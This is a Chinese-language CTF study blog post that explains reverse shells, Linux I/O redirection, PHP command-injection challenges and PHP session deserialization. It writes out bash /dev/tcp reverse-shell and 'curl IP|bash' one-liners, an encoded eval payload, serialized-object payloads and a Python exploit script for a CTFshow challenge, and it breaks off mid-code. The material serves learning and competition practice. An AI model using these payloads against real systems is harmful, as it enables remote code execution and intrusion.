    <content><![CDATA[<h3 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h3><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<span id="more"></span><!-- more --><!-- more -->

<p>正向连接</p>
<p>就是我们客户端连服务器</p>
<p>我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接</p>
<p>反向连接</p>
<p>就是让服务器连我们</p>
<p>一般适用于</p>
<ul>
<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
<li>目标机端口被占用。</li>
<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的</li>
<li>向web里面的话有可能出现在rce当中过滤的函数实在太多，我们只能去实现反向连shell</li>
</ul>
<h3 id="常见的方式"><a href="#常见的方式" class="headerlink" title="常见的方式"></a><strong>常见的方式</strong></h3><ul>
<li><p>Bash反弹shell</p>
</li>
<li><p>首先我们先了解下Linux的连接符号和重定向</p>
</li>
<li><p><strong>什么是重定向：</strong></p>
</li>
<li><p>Linux中的重定向就是<strong>将原本要输出到屏幕中的数据信息,重新指向某个特定文件当中</strong>，或者定向到黑洞文件（&#x2F;dev&#x2F;null）中。</p>
</li>
<li><p><strong>重定向的作用:</strong></p>
<ul>
<li><p>当屏幕输出的信息很重要,希望保存时</p>
</li>
<li><p>后台执行的程序一般都会有输出，不希望它输出干扰到终端</p>
</li>
<li><p>执行定时备份任务，希望将备份结果保留下来时</p>
</li>
<li><p>执行一些命令,会提示一些报错信息,可以直接将报错丢弃。</p>
</li>
<li><p>执行命令时希望将报错和正确内容区分在不同文件中时（日志）</p>
</li>
<li><ol>
<li><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2></li>
</ol>
</li>
<li><blockquote>
<ol>
<li>文件描述符是IO重定向中的重要概念。文件描述符使用数字表示，它指明了数据的流向特征。</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>在Linux中我们分别使用描述符0，1，2表示</p>
<p>这三个默认的符号文件分别是终端字符设备的软连接&#x2F;dev&#x2F;stdin、&#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;srderr</p>
<p>表示标准输入、标准输出、和报错</p>
<p>当进程操作一个文件时：</p>
<p>首先程序是无法直接访问硬件，需要借助内核来访问文件</p>
<p>而内核kernel需要利用文件描述（file descriptor）来访问</p>
<p>总结：进程使用文件描述符来管理打开的文件对应关系</p>
<p><strong>通常程序访问一个文件至少会打开三个标准文件，分别是标准输入，<strong><strong>标准输出</strong></strong>，错误输出</strong></p>
<p><strong>进程将从标准输入中的到数据，将正常输出打印至屏幕终端，将错误的输出信息也打印至屏幕终端</strong></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>我们使用&gt;或者&gt;&gt;时符号<strong>左边</strong>表示文件描述符，没有的话默认<strong>是1</strong>（标准输出）符号右边可以是文件也可以是输出设备（linux中万物都是文件，且设备也是文件）<strong>当使用&gt;时，会判断右边的文件存不存在，如果存在的话就先删除，然后创建一个新的文件，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件</strong></p>
<p>简单用法就不举例子了</p>
<p>高级用法：</p>
<p>#将错误输出信息关闭掉，控制台只打印了标准输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<p>#&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>#&#x2F;dev&#x2F;null 这个设备，是linux 中黑洞设备，什么信息只要输出给这个设备，都会给吃掉</p>
<p>#关闭所有输出</p>
<p>#关闭 1 ，2 文件描述符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 1&gt;&amp;- 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>#将1,2 输出转发给&#x2F;dev&#x2F;null设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[chengmo@centos5 shell]$ ls test.sh test1.sh  2&gt;/dev/null 1&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>#将标准输出fd&#x3D;1重定向到&#x2F;dev&#x2F;null文件，然后将fd&#x3D;2重定向到fd&#x3D;1所绑定的&#x2F;dev&#x2F;null文件。这种常用文件描述符前必须有个 &amp;, 否则2&gt;1就变成将错误输出输出到一个名为1的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]<span class="built_in">cat</span> 1.txt 2.txt &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>#&amp;&gt;代表将标准输出与标准错误重定向到&#x2F;dev&#x2F;null文件</p>
<h3 id="输入重定向实例"><a href="#输入重定向实例" class="headerlink" title="输入重定向实例"></a><strong>输入重定向实例</strong></h3><p>我们使用<code>&lt;</code>对输入做重定向，<strong>如果符号左边没有写值，那么默认就是0。</strong> <strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command-line [n] &lt;文件</span><br></pre></td></tr></table></figure>

<p>命令默认从键盘获得的输入，使用输入重定向改成从文件，或者其它打开文件以及设备输入。执行这个命令，将标准输入0，与文件或设备绑定，将由它进行输入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat &gt; stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">[root@sccprocddev02:/home/upro01]cat stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br></pre></td></tr></table></figure>

<p>#这里使用ctrl+d 或者ctrl+c退出输入</p>
<p>#从标准输入[键盘]获得数据，然后输出给stdout.txt文件</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout2.txt &lt; stdout.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat stdout2.txt</p>
<p>this is stdout.txt</p>
<p>#从stdout.txt获得输入数据，然后输出给文件stdout2.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout3.txt &lt;&lt; end</p>
<blockquote>
<p>first line</p>
<p>second line</p>
<p>end</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]#cat stdout3.txt</p>
<p>first line</p>
<p>second line</p>
<p>#&lt;&lt; 这个连续两个小符号， 他代表的是[结束的输入字符]的意思。这样当空行输入end字符时，自动退出输入，不需要使用ctrl+d或者ctrl+c退出</p>
</blockquote>
<p>先简单了解下这两个</p>
<p>回到Bash反弹shell</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.<span class="number">72/2333</span> <span class="number">0</span>&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>或</p>
<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1”    #更稳定</p>
<p>#bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机端口 0&gt;&amp;1</p>
<p>&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>所以这段指令就是在目标及和主机之间进行一个bash的shell交互环境，在主机上从键盘输出到0（也就是输出到目标机上比如我们执行指令），目标机进行输出（收到主机的指令，进行输出到主机上面）从而形成回路</p>
<p>然后攻击机在本地监听就可以了</p>
<p>nc -lvvn 2333</p>
<p>Curl配合Bash反弹shell首先，在攻击者vps的web目录里面<strong>创建一个index文件</strong>（index.php或index.html），内容如下</p>
<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p>
<p>#使用 bash -i 命令启动一个交互式的 Bash shell。然后将 shell 的标准输入、标准输出和标准错误重定向到 TCP 连接上,连接到 IP 地址 47.xxx.xxx.72 的 2333 端口</p>
<p>并开启2333端口的监听然后再目标机上执行如下，即可反弹shell：</p>
<p>curl 47.xxx.xxx.72|bash</p>
<p>#使用curl指令从 IP 地址 47.xxx.xxx.72 下载一个文件或脚本。然后将下载的内容通过管道符 | 传递给 bash 命令,也就是执行这个下载的脚本。</p>
<p><code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
<p>基本了解了bash的反弹shell之后我们找题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;  <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  &#125;  <span class="keyword">else</span>&#123;     <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这个题目的关键函数</p>
<p><strong>strCheck()函数</strong>是用来检查输入的命令是否包含一些危险的关键字,比如;、&amp;、$等。如果包含这些关键字,函数会直接退出并输出”i hate this”。</p>
<p>cmd进行传参传给strCheck()</p>
<p><strong>如果strCheck()函数没有拦截该命令,代码会使用</strong></p>
<p><strong>shell_exec()函数执行该命令</strong></p>
<p>shell_exec()是PHP中用于执行系统命令的一个函数。它的作用是执行一个外部程序或命令,并将该命令的输出以字符串的形式返回。</p>
<p>用了shell_exec函数执行命令，但是不能回显，这里可以用重定向将命令写入到指定的文件</p>
<p>利用重定向执行ls &#x2F; 输出到1.txt</p>
<p>进入1.txt</p>
<p>执行同样操作</p>
<p>看到flag，下面将flag进行输出</p>
<p>再次访问1.txt得到flag</p>
<h2 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024 simple_php"></a><strong>CISCN2024 simple_php</strong></h2><p>今年国赛的一道题目</p>
<p>属实让我一脸懵逼        </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$cmd</span> = escapeshellcmd<span class="variable">$$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>,<span class="variable">$cmd</span>)) </span><br><span class="line"></span><br><span class="line">&#123;     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很多函数我都没见过，还过滤这么多东西</p>
<p>坐牢一下午</p>
<p>函数就不进行解释了</p>
<p>发现可以通过换行符进行了绕过</p>
<p>看了一些wp，这些人是这么想到的？他们竟然能用rce来做这题</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>

<p>php -r这真让人难以想到</p>
<p>找到flag就可以了</p>
<p>文章：<a href="https://xia0ji233.pro/2024/05/19/CISCN2024/index.html">https://xia0ji233.pro/2024/05/19/CISCN2024/index.html</a></p>
<p>还有一种就是反弹shell了</p>
<p>以为可以%0a换行符号绕过</p>
<p>在复现之前我得先搭建个服务器给自己</p>
<p>所以这几天我看能不能搭建自己的服务器</p>
<h1 id="PHP的session反序列化漏洞"><a href="#PHP的session反序列化漏洞" class="headerlink" title="PHP的session反序列化漏洞"></a><strong>PHP的session反序列化漏洞</strong></h1><p>反序列化还是有一点点的基础，现在的想法就是边做题边看wp边学习做笔记，先学广在慢慢学精</p>
<p>SESSION先了解下</p>
<p><strong>PHP Session 概述</strong></p>
<p>session 是一种客户与网站（服务器）更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用（保持）这个会话，从而让访问者与网站之间建立了一种“对话”机制。</p>
<p>这是官方的解释</p>
<p>session 会话会为每一个开启了 session 会话的访问者建立一个唯一的会话 ID ，用于识别用户。该会话 ID 可能存储于用户电脑的 cookie 内，也可能通过 URL 来传递。而对应的具体 session 值会存储于服务器端，这也是与 cookie 的主要区别，并且安全性相对较高。</p>
<p>回到session的反序列化</p>
<p>在php.ini中存在三项配置项：</p>
<ul>
<li><code>session.save_path=&quot;&quot;</code>  –设置session的存储路径</li>
<li><code>session.save_handler=&quot;&quot;</code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
<li><code>session.auto_start  boolen</code> –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</li>
<li><code>session.serialize_handler  string</code>–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</li>
</ul>
<p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。</p>
<p>举例：</p>
<ul>
<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
<li><code>session.save_handler=files</code>   表明session是以文件的方式来进行存储的</li>
<li><code>session.auto_start=0</code>  表明默认不启动session</li>
<li><code>session.serialize_handler=php</code>   表明session的默认序列话引擎使用的是php序列话引擎</li>
</ul>
<ol>
<li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li>
<li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li>
<li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li>
</ol>
<p><strong>存储机制</strong></p>
<p>php中的session中的内<strong>容并不是放在内存</strong>中**的，而是以*文件******的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
<p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
<p>假设我们的环境是xampp，那么默认配置如上所述。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在php_serialzie引擎下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code> 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
<p><strong>在php_binary引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<p><strong>序列化简单利用</strong></p>
<?php

class syclover{

 var $func=""; function __construct() {  $this->func = "phpinfo()";

 }

 function __wakeup(){

  eval($this->func);

 }

}

unserialize($_GET['a']);

?>

<p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行<code>eval()</code>方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code>。</p>
<p>得到的反序列化内容是</p>
<p>object(syclover)[1]</p>
<p> public ‘func’ &#x3D;&gt; string ‘echo “spoock”;’ (length&#x3D;14)</p>
<p><strong>PHP Session中的序列化危害</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。</p>
<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<p>$_SESSION<code>[</code>‘ryat’<code>] = </code>‘|O:11:”PeopleClass”:0:{}’&#96;&#96;;</p>
<p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>。</p>
<p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
<p>array<code> </code>(size&#x3D;1)<code> </code>‘a:1:{s:6:”spoock”;s:24:”‘<code> </code>&#x3D;&gt; <code> </code>object(__PHP_Incomplete_Class)[1]<code> </code>public<code> </code>‘__PHP_Incomplete_Class_Name’<code> </code>&#x3D;&gt; string &#96;&#96;’PeopleClass’<code> </code>(length&#x3D;11)</p>
<p>这是因为当使用php引擎的时候，<strong>php引擎会以|作为作为key和value的分隔符</strong>，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<p><strong>实际利用</strong></p>
<p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎（session.serialize_handler）不一样，就形成了一个漏洞、</p>
<p>s1.php，使用php_serialize来处理session</p>
<?php ini_set`(`'session.serialize_handler','php_serialize'`);`session_start();

$$_SESSION``[``"spoock"``]=`$$_GET`[`"a"``];

**us2.php,使用php来处理session**

ini_set`(`'session.serialize_handler'`,'php'`);

session_start();

class` `lemon {

​    var` `$hi``;`     function` `__construct(){      $this`->hi = `'phpinfo();';`           }``          function` `__destruct() {         `eval`(`$this`->hi);         ` ``}`       `}

**当访问s1.php时，提交如下的数据：**

localhost/s1.php?a=|O:5:`"lemon"`:1:{s:2:`"hi"`;s:14:`"echo "`spoock`";"`;}

此时传入的数据会按照php_serialize来进行序列化。

此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的`eval()`方法。

例题

# **CTFSHOW 新生杯**

### **剪刀石头布**

考查[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)反序列化漏洞。 不同的session处理器会导致[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)漏洞

exp：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://697e59f6-2b82-43b9-806d-25fa3965a86b.challenge.ctf.show/&quot;</span><br><span class="line">sess=&quot;yu22x&quot;</span><br><span class="line">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;|O:4:&quot;Game&quot;:1:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#x27;&#125;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files,cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;yu22x&#x27;&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

# **安恒杯一道题**

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="variable language_">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

index.php

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">分析可以知道最后肯定是要用execue里的<span class="keyword">eval</span>的</span><br><span class="line"></span><br><span class="line">在本地搭建环境，构造我们需要执行的自定义函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">foo3</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  